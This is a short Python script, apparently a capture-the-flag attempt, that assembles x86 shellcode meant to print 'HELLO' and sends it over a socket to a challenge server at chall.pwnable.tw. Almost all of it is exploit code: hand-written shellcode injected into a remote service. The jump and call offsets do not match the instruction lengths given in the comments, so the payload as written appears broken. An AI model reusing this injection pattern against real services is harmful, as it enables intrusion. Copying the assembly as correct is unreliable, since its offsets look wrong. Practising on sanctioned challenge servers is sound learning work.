#!/usr/bin/env python3

# Debug shellcode - let's test if we can write anything at all

import socket
import time

def create_debug_shellcode():
    # Shellcode that just writes "HELLO" to stdout
    shellcode = b""
    
    # jmp-call-pop to get string
    shellcode += b"\xeb\x1a"              # jmp 0x1c
    
    # pop instruction
    shellcode += b"\x5e"                  # pop esi
    
    # write syscall
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x04"              # mov al, 4 (sys_write)
    shellcode += b"\xb3\x01"              # mov bl, 1 (stdout)
    shellcode += b"\x89\xf1"              # mov ecx, esi (buffer)
    shellcode += b"\x31\xd2"              # xor edx, edx
    shellcode += b"\xb2\x05"              # mov dl, 5 (write 5 bytes)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # exit
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x40"                  # inc eax
    shellcode += b"\xcd\x80"              # int 0x80
    
    # call instruction
    shellcode += b"\xe8\xe1\xff\xff\xff"  # call $-0x1f
    
    # string
    shellcode += b"HELLO"
    
    return shellcode

def test_debug_shellcode():
    shellcode = create_debug_shellcode()
    print(f"Debug shellcode: {shellcode.hex()}")
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("chall.pwnable.tw", 10001))
    
    data = s.recv(1024)
    print(f"Received: {repr(data)}")
    
    s.send(shellcode)
    
    time.sleep(2)
    try:
        response = s.recv(1024)
        print(f"Response: {repr(response)}")
    except:
        print("No response")
    
    s.close()

if __name__ == "__main__":
    test_debug_shellcode()